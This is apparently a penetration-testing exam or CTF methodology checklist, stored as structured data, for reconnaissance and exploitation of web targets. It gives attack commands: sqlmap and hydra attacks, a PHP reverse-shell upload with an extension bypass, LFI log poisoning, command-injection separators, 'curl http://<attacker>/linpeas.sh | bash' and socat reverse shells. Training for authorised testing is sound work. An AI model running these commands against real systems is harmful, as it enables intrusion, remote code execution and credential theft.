name: Argha Dey Master Recon Methodology
description: 15-phase end-to-end reconnaissance checklist derived from Argha Dey's notes. The chain: Nmap → Web tech fingerprint → Directory fuzzing → Hidden file/leak → Anonymous access → .git leaks → Backup files → CMS enum → Burp workflow → Credential attacks → File upload → LFI → CMDi → IoT recon → Post-foothold enum.
examHabits: nmap -sC -sV -T4 -Pn -A -oN <ip>.txt <ip> - note every open port, not just 80/443
If FTP open: try anonymous login, binary +passive, grab everything
whatweb / check http-generator, Server header, page title, favicon for tech fingerprint
view-source the homepage - read every comment, every <a href>
Directory/file fuzz with feroxbuster (recursive) then ffuf, common.txt first then big.txt
If .git found: git_dumper.py, then git log + git show <every commit>
If a login form exists: test for SQLi with single quote; if error, sqlmap -r request.txt --dbs --batch
If CMS identified: run the matching scanner (WPScan, etc.) and Google default creds + CVEs for the exact version
If a utility feature exists (ping/upload/search/reset-password): test command injection, file-upload bypass, IDOR, and logic-flaw abuse
Any parameter that loads a page or file: test LFI, then pivot to log poisoning
On foothold: sudo -l, SUID hunt, LinPEAS, GTFOBins, cron jobs, readable id_rsa/config secrets
Never stop at the first flag - the chain usually continues to root or pivots to a second host
quickRef: nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | whatweb http://<ip>/

decisionPoints.action: Run whatweb and check http-title/http-server-header/http-generator
decisionPoints.fallback: Proceed to full NSE script scan on non-web ports

decisionPoints.action: Anonymous FTP login, binary mode, passive, ls and get everything
decisionPoints.fallback: Check SMB for anonymous shares

decisionPoints.action: nmap -p- -T4 --min-rate 5000 -oG allports.txt <ip>, then re-run -sV only on discovered ports
decisionPoints.fallback: Use full scan with -T4 -A

decisionPoints.action: Proceed to WPScan enumeration
decisionPoints.fallback: Google product + version for known CVEs

decisionPoints.action: Fuzz for real vhost/path with feroxbuster/ffuf
decisionPoints.fallback: Check for hidden admin portals in page source

decisionPoints.action: Scan separately - common pattern: one port = public site, other = internal admin panel
decisionPoints.fallback: Check page source comments for employee/admin portals

decisionPoints.action: feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/{common,big,raft-*.txt}
decisionPoints.fallback: Use ffuf for extension-aware fuzzing

decisionPoints.action: ffuf -u http://<ip>/FUZZ -w seclists/big.txt -e .php
decisionPoints.fallback: gobuster dir -u http://<ip>/ -w seclists/big.txt -x php,txt,bak,zip

decisionPoints.action: ftp anonymous@<ip>; binary; passive; ls; get files
decisionPoints.fallback: Check SMB shares: smbclient -L //<ip> -N

decisionPoints.action: netexec smb <ip> -u '' -p '' or smbclient -L //<ip> -N
decisionPoints.fallback: Proceed to LDAP anonymous bind check

steps.phase: Phase 5 - Source Code / Version Control Leaks (.git)

decisionPoints.action: git_dumper.py http://<ip>/.git/ ./dumped_dir, then git log + git show <every commit>
decisionPoints.fallback: wget -r http://<ip>/.git/

decisionPoints.action: git log -p to inspect full diffs; old commits still contain live creds
decisionPoints.fallback: grep -R -i -E 'pass|secret|key|token' dumped_dir/

decisionPoints.action: wget http://<ip>/backup/old_database.sql; grep -i -E 'insert into|user|pass' old_database.sql
decisionPoints.fallback: Check for security question answers for password-reset abuse

decisionPoints.action: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --disable-tls-checks
decisionPoints.fallback: Enumerate users via REST API: curl /wp-json/wp/v2/users

decisionPoints.condition: Branded login page (OTRS, Jenkins, phpMyAdmin, Tomcat)
decisionPoints.action: Google '<product> default credentials' + '<product> CVE <year>'
decisionPoints.fallback: Try well-known default pairs even if not documented default

decisionPoints.action: Proxy > Intercept on, submit form, save request to request.txt for sqlmap
decisionPoints.fallback: Send to Repeater for manual parameter tampering

decisionPoints.action: Send to Intruder: Cluster bomb (unknown user+pass), Sniper (one known), numeric range for OTP
decisionPoints.fallback: Diff rendered page vs raw HTML response for hidden tokens

decisionPoints.condition: Injectable parameter confirmed with single quote (SQL error visible)
decisionPoints.action: sqlmap -r request.txt -dbs --batch
decisionPoints.fallback: Manual UNION-based extraction

decisionPoints.condition: Login form with valid username known
decisionPoints.action: hydra -L users.txt -P passwords.txt <ip> http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'
decisionPoints.fallback: Use Burp Intruder with Cluster Bomb for extra form fields

decisionPoints.condition: Upload feature found with extension restriction (.pdf/.html/.image)
decisionPoints.action: Craft PHP reverse shell, rename to shell.php.pdf, intercept POST in Burp, rewrite filename to shell.php
decisionPoints.fallback: Flip hidden allow_all parameter or change Content-Type to application/octet-stream

decisionPoints.action: Start listener: rlwrap nc -lnvp 4444; curl http://<ip>/uploads/shell.php
decisionPoints.fallback: Check for client-side validation bypass comments in page source

decisionPoints.action: Test ....// bypass if ../ is filtered; then poison Apache User-Agent via curl -A
decisionPoints.fallback: Try auth.log, PHP session files, data:// wrapper

decisionPoints.condition: Log file unreachable / log poisoning blocked
decisionPoints.action: Try /proc/self/environ poison or PHP session file poisoning
decisionPoints.fallback: Use php://filter/convert.base64-encode to read config.php for DB creds

decisionPoints.condition: Utility pages found (ping.php, diag.php, traceroute.php, nslookup.php)
decisionPoints.action: Test separators: ; id, | id, $(id), %0a id, URL-encoded variants
decisionPoints.fallback: Use commix --url=... for automatic technique detection

decisionPoints.action: Check for encoded secrets via ?ip=|cat ..%2Fssh_pk_creds.txt
decisionPoints.fallback: Decode with CyberChef (Base64 → RC4/XOR recipe)

decisionPoints.condition: Firmware file discovered on IoT target
decisionPoints.action: binwalk <file>; binwalk -e <file>; file extracted blobs
decisionPoints.fallback: strings <binary> | grep -i 'busybox|gcc|linux version'

decisionPoints.action: sqlite3 config.sqlite .dump | grep -i <keyword>
decisionPoints.fallback: grep -R 'DeviceID' . for device model identification

decisionPoints.condition: Any shell obtained (webshell, reverse shell, SSH)
decisionPoints.action: whoami; id; hostname; uname -a; cat /etc/passwd | grep bash; sudo -l; find / -perm -4000 -type f 2>/dev/null
decisionPoints.fallback: Run LinPEAS: curl http://<attacker>/linpeas.sh | bash

decisionPoints.action: stabilize: python3 -c 'import pty; pty.spawn("/bin/bash")'; stty raw -echo; export TERM=xterm
decisionPoints.fallback: socat file:tty,raw,echo=0 tcp-listen:4444 (attacker) + socat exec:bash -li... (victim)

steps.phase: Phase 15 - Master Recon Checklist (mental, every new Web Range IP)

decisionPoints.action: Run entire checklist: nmap → whatweb → view-source → robots.txt → ffuf → .git/.backup/.env → SQLi test → CMS scan → utility feature test → LFI test → foothold → sudo -l/SUID/LinPEAS
decisionPoints.fallback: Use the full phase list above as execution guide
